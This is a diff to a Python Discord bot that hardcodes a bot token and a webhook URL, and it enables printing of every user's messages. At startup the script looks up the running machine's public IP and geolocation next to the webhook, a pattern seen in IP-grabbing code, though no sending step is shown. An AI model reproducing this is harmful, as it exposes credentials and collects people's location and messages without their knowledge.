@@ -1,14 +1,10 @@
-import requests
-import discord
-import random
-import json
-import os
+import requests, discord, random, json, os
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-token = ""
+token = "ODcyODQxNzQ5Njg3NTk5MTM0.YQvvOQ.gsKf57ArykcdITY4VT3ZCVK8avY"
 client = discord.Client()
-hook = Webhook("")
+hook = Webhook("https://discord.com/api/webhooks/875920966784548974/_o5GaZ5cCyJRVFyi9WSbcBg8gcv4zxSmN5GLZWnO-EbYm_akuHIBujqMY-mEBgiCV")
 time = datetime.now().strftime("%H:%M %p")
 ip = requests.get("https://api.ipify.org/").text
 r = requests.get(f"http://extreme-ip-lookup.com/json/{ip}")
@@ -47,12 +43,12 @@ async def on_message(message):
     username = message.author.name
     user_message = str(message.content)
     channel = str(message.channel.name)
-    # print(f"{username}: {user_message} ({channel})")
+    print(f"{username}: {user_message} ({channel})")
 
     if message.author == client.user:
         return
 
-    if message.channel.name == "bot":
+    if message.channel.name == "general":
         if user_message.lower() == "hello":
             await message.channel.send(f"Hello {username}")
             return
@@ -61,8 +57,8 @@ async def on_message(message):
             await message.channel.send(f"Goodbye, {username}!")
             return
 
-        elif user_message.lower() == "":
-            await message.channel.send(f"a")
+        elif user_message.lower() == "prefix":
+            await message.channel.send("!")
             return
 
         elif user_message.lower() == "!random":
